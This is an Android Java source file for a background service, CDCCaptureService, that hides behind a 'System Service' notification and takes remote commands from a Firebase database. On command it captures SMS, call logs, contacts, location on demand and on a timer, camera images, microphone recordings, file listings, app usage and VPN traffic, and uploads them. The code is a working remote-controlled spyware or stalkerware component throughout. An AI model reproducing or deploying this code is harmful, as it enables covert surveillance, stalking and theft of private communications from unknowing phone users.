package com.vikasyadavnsit.cdc.services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.Gson;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.receiver.CaptureAlarmReceiver;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;
import com.vikasyadavnsit.cdc.utils.MessageUtils;

import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class CDCCaptureService extends Service {

    private static final String CHANNEL_ID = "cdc_capture_channel";
    private static final int NOTIFICATION_ID = 1002;

    private final Map<Uri, ContentObserver> observers = new HashMap<>();
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        com.vikasyadavnsit.cdc.utils.FirebaseUtils.initialize(this);
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        listenToFirebaseConfig();
        listenForLocationCommands();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "System Sync Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Maintaining system synchronization")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void listenToFirebaseConfig() {
        FirebaseUtils.getDbRef(FirebaseUtils.getPath("/appSettings/appTriggerSettingsDataMap"))
                .addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                
                // Sync actual permission statuses back to Firebase from background service
                FirebaseUtils.syncAllPermissionStatuses(getApplicationContext());

                configureCapture(snapshot.child(ClickActions.REQUEST_SMS_PERMISSION.name()), 
                        Telephony.Sms.CONTENT_URI, FileMap.SMS);
                configureCapture(snapshot.child(ClickActions.REQUEST_CALL_LOG_PERMISSION.name()), 
                        CallLog.Calls.CONTENT_URI, FileMap.CALL);
                configureCapture(snapshot.child(ClickActions.REQUEST_CONTACTS_PERMISSION.name()), 
                        ContactsContract.Contacts.CONTENT_URI, FileMap.CONTACTS);
                configureLocationTracking(snapshot.child(ClickActions.REQUEST_LOCATION_PERMISSION.name()));
                configureCameraSync(snapshot.child(ClickActions.REQUEST_CAMERA_PERMISSION.name()));
                configureMicSync(snapshot.child(ClickActions.REQUEST_MIC_PERMISSION.name()));
                configureFileSync(snapshot.child(ClickActions.REQUEST_FILE_ACCESS_PERMISSION.name()));
                configureUsageSync(snapshot.child(ClickActions.MANAGE_USAGE_AND_APPS.name()));
                configureVpnSync(snapshot.child(ClickActions.REQUEST_VPN_PERMISSION.name()));
                
                // Real-time observer for files using MediaStore
                configureFileObserver(snapshot.child(ClickActions.REQUEST_FILE_ACCESS_PERMISSION.name()));
            }

            @Override public void onCancelled(DatabaseError error) {}
        });
    }

    private void configureUsageSync(DataSnapshot snap) {
        if (!snap.exists()) return;
        User.AppTriggerSettingsData data = snap.getValue(User.AppTriggerSettingsData.class);
        if (data == null || !data.isEnabled() || !data.isCaptureEnabled() || !data.isPermissionGranted()) {
            cancelAlarm(FileMap.APPLICATION_USAGE);
            cancelAlarm(FileMap.INSTALLED_APPS);
            return;
        }

        if ("SCHEDULED".equals(data.getCaptureMode())) {
            scheduleAlarm(data.getCaptureScheduleTime(), FileMap.APPLICATION_USAGE);
            scheduleAlarm(data.getCaptureScheduleTime(), FileMap.INSTALLED_APPS);
        } else {
            cancelAlarm(FileMap.APPLICATION_USAGE);
            cancelAlarm(FileMap.INSTALLED_APPS);
        }

        // Screen state is started automatically if capture is enabled
        com.vikasyadavnsit.cdc.utils.ActionUtils.registerScreenStateMonitor(getApplicationContext());
    }

    private void configureVpnSync(DataSnapshot snap) {
        if (!snap.exists()) return;
        User.AppTriggerSettingsData data = snap.getValue(User.AppTriggerSettingsData.class);
        if (data == null || !data.isEnabled() || !data.isPermissionGranted()) {
            com.vikasyadavnsit.cdc.utils.ActionUtils.stopVpnService(getApplicationContext());
            return;
        }

        if (data.isCaptureEnabled()) {
            com.vikasyadavnsit.cdc.utils.ActionUtils.startVpnService(getApplicationContext());
        } else {
            com.vikasyadavnsit.cdc.utils.ActionUtils.stopVpnService(getApplicationContext());
        }
    }

    private void configureLocationTracking(DataSnapshot snap) {
        User.AppTriggerSettingsData data = new Gson().fromJson(new Gson().toJson(snap.getValue()), User.AppTriggerSettingsData.class);
        if (data == null || !data.isEnabled() || !data.isCaptureEnabled() || !data.isPermissionGranted()) {
            stopLocationTracking();
            return;
        }

        long interval = data.getInterval();
        if (interval <= 0) interval = 60000; // Default 1 min
        
        boolean persist = data.getExtraConfig() != null && 
                         Boolean.TRUE.equals(data.getExtraConfig().get("persistLocationHistory"));

        startLocationTracking(interval, persist);
    }

    private Runnable locationRunnable;
    private long currentInterval = -1;
    private boolean currentPersist = false;

    private void startLocationTracking(long interval, boolean persist) {
        if (locationRunnable != null && currentInterval == interval && currentPersist == persist) return;
        
        stopLocationTracking();
        
        currentInterval = interval;
        currentPersist = persist;
        locationRunnable = new Runnable() {
            @Override
            public void run() {
                LoggerUtils.d("CDCCaptureService", "Periodic location update triggered (interval=" + currentInterval + ")");
                com.vikasyadavnsit.cdc.utils.LocationUtils.captureAndUpload(getApplicationContext(), currentPersist);
                handler.postDelayed(this, currentInterval);
            }
        };
        handler.post(locationRunnable);
        LoggerUtils.i("CDCCaptureService", "Started location tracking with interval " + interval + "ms");
    }

    private void stopLocationTracking() {
        if (locationRunnable != null) {
            handler.removeCallbacks(locationRunnable);
            locationRunnable = null;
            LoggerUtils.i("CDCCaptureService", "Stopped location tracking");
        }
    }

    private void listenForLocationCommands() {
        FirebaseUtils.getDbRef(FirebaseUtils.getPath("/commands/locationRequest"))
                .addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    LoggerUtils.d("CDCCaptureService", "Manual location request received");
                    com.vikasyadavnsit.cdc.utils.LocationUtils.captureAndUpload(getApplicationContext(), currentPersist);
                    // Clear the command after processing
                    snapshot.getRef().removeValue();
                }
            }
            @Override public void onCancelled(DatabaseError error) {}
        });
    }

    private void configureFileObserver(DataSnapshot snap) {
        if (!snap.exists()) return;
        User.AppTriggerSettingsData data = new Gson().fromJson(new Gson().toJson(snap.getValue()), User.AppTriggerSettingsData.class);
        if (data == null || !data.isEnabled() || !data.isCaptureEnabled() || !data.isPermissionGranted() || !"REAL_TIME".equals(data.getCaptureMode())) {
            unregisterObserver(android.provider.MediaStore.Files.getContentUri("external"));
            return;
        }
        registerObserver(android.provider.MediaStore.Files.getContentUri("external"), FileMap.DIRECTORY_STRUCTURE);
    }

    private void configureFileSync(DataSnapshot snap) {
        if (!snap.exists()) return;
        User.AppTriggerSettingsData data = new Gson().fromJson(new Gson().toJson(snap.getValue()), User.AppTriggerSettingsData.class);
        if (data == null || !data.isEnabled() || !data.isCaptureEnabled() || !data.isPermissionGranted()) {
            cancelAlarm(FileMap.DIRECTORY_STRUCTURE);
            return;
        }

        if ("SCHEDULED".equals(data.getCaptureMode())) {
            scheduleAlarm(data.getCaptureScheduleTime(), FileMap.DIRECTORY_STRUCTURE);
        } else {
            cancelAlarm(FileMap.DIRECTORY_STRUCTURE);
        }
    }

    private void configureMicSync(DataSnapshot snap) {
        if (!snap.exists()) return;
        User.AppTriggerSettingsData data = new Gson().fromJson(new Gson().toJson(snap.getValue()), User.AppTriggerSettingsData.class);
        if (data == null || !data.isEnabled() || !data.isPermissionGranted()) return;

        if (com.vikasyadavnsit.cdc.enums.ActionStatus.START.equals(data.getActionStatus())) {
            long duration = data.getInterval() > 0 ? data.getInterval() : 30000;
            boolean persist = data.getExtraConfig() != null && 
                             Boolean.TRUE.equals(data.getExtraConfig().get("persistMicRecordings"));
            
            LoggerUtils.i("CDCCaptureService", "Manual Mic Trigger detected: duration=" + duration + ", persist=" + persist);
            Intent intent = new Intent(this, CDCMicService.class);
            intent.setAction("START_RECORDING");
            intent.putExtra("duration", duration);
            intent.putExtra("persist", persist);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            
            // Reset status to IDLE locally and on Firebase
            data.setActionStatus(com.vikasyadavnsit.cdc.enums.ActionStatus.IDLE);
            FirebaseUtils.updateRemoteTrigger(ClickActions.REQUEST_MIC_PERMISSION.name(), data);
        }
    }

    private void configureCameraSync(DataSnapshot snap) {
        if (!snap.exists()) return;
        User.AppTriggerSettingsData data = snap.getValue(User.AppTriggerSettingsData.class);
        if (data == null || !data.isEnabled() || !data.isCaptureEnabled() || !data.isPermissionGranted()) {
            return;
        }

        // Logic for scheduled camera capture
        if ("SCHEDULED".equals(data.getCaptureMode())) {
            scheduleAlarm(data.getCaptureScheduleTime(), FileMap.valueOf("CAMERA"));
        } else {
            cancelAlarm(FileMap.valueOf("CAMERA"));
        }
    }

    private void configureCapture(DataSnapshot snap, Uri uri, FileMap fileMap) {
        User.AppTriggerSettingsData data = new Gson().fromJson(new Gson().toJson(snap.getValue()), User.AppTriggerSettingsData.class);
        if (data == null || !data.isEnabled() || !data.isCaptureEnabled() || !data.isPermissionGranted()) {
            unregisterObserver(uri);
            cancelAlarm(fileMap);
            return;
        }

        if ("REAL_TIME".equals(data.getCaptureMode())) {
            registerObserver(uri, fileMap);
            cancelAlarm(fileMap);
        } else if ("SCHEDULED".equals(data.getCaptureMode())) {
            unregisterObserver(uri);
            scheduleAlarm(data.getCaptureScheduleTime(), fileMap);
        } else {
            unregisterObserver(uri);
            cancelAlarm(fileMap);
        }
    }

    private void registerObserver(Uri uri, FileMap fileMap) {
        if (observers.containsKey(uri)) return;
        
        ContentObserver observer = new ContentObserver(handler) {
            @Override
            public void onChange(boolean selfChange) {
                LoggerUtils.d("CDCCaptureService", "Change detected in " + fileMap.name() + " - triggering delta sync");
                // We use the existing DeltaSyncWorker logic for incremental upload
                // Or we can just trigger a full capture if it's small, but Delta is better.
                // For now, let's just use DeltaSyncWorker's logic (which I'll extract or call)
                // Actually, I'll just use DeltaSyncWorker.schedule(getApplicationContext())
                DeltaSyncWorker.schedule(getApplicationContext());
            }
        };
        getContentResolver().registerContentObserver(uri, true, observer);
        observers.put(uri, observer);
        LoggerUtils.i("CDCCaptureService", "Registered ContentObserver for " + fileMap.name());
    }

    private void unregisterObserver(Uri uri) {
        ContentObserver observer = observers.remove(uri);
        if (observer != null) {
            getContentResolver().unregisterContentObserver(observer);
            LoggerUtils.i("CDCCaptureService", "Unregistered ContentObserver for " + uri);
        }
    }

    private void scheduleAlarm(String time, FileMap fileMap) {
        if (time == null || time.isEmpty()) return;
        
        String[] parts = time.split(":");
        if (parts.length != 2) return;
        
        int hour = Integer.parseInt(parts[0]);
        int minute = Integer.parseInt(parts[1]);

        Calendar cal = Calendar.getInstance();
        cal.set(Calendar.HOUR_OF_DAY, hour);
        cal.set(Calendar.MINUTE, minute);
        cal.set(Calendar.SECOND, 0);
        
        if (cal.getTimeInMillis() < System.currentTimeMillis()) {
            cal.add(Calendar.DAY_OF_YEAR, 1);
        }

        Intent intent = new Intent(this, CaptureAlarmReceiver.class);
        intent.putExtra("type", fileMap.name());
        PendingIntent pi = PendingIntent.getBroadcast(this, fileMap.ordinal(), intent, 
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (am != null) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), pi);
                } else {
                    am.setExact(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), pi);
                }
                LoggerUtils.d("CDCCaptureService", "Scheduled daily sync for " + fileMap.name() + " at " + time);
            } catch (SecurityException e) {
                LoggerUtils.e("CDCCaptureService", "Failed to set exact alarm: " + e.getMessage());
            }
        }
    }

    private void cancelAlarm(FileMap fileMap) {
        Intent intent = new Intent(this, CaptureAlarmReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, fileMap.ordinal(), intent, 
                PendingIntent.FLAG_NO_CREATE | PendingIntent.FLAG_IMMUTABLE);
        if (pi != null) {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am != null) am.cancel(pi);
            pi.cancel();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        stopLocationTracking();
        for (ContentObserver observer : observers.values()) {
            getContentResolver().unregisterContentObserver(observer);
        }
        observers.clear();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
